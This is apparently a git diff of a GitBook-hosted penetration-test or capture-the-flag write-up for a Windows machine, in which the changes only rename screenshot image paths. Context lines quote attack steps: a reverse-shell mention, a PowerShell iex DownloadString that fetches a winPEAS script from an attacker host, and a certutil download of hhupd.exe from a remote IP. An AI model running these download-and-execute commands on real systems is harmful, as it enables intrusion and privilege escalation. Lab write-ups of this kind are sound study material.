@@ -142,7 +142,7 @@ I realized my reverse shell wasn't working as it is a Windows box. I uploaded a 
 
 
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (45) (3).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -372,7 +372,7 @@ Invoke-AllChecks
 <strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/Invoke-winPEAS.ps1') 
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (35) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (35) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -489,7 +489,7 @@ certutil -urlcache -f http://10.10.162.126:81/hhupd.exe hhupd.exe
 
 <figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (36) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (36) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
 
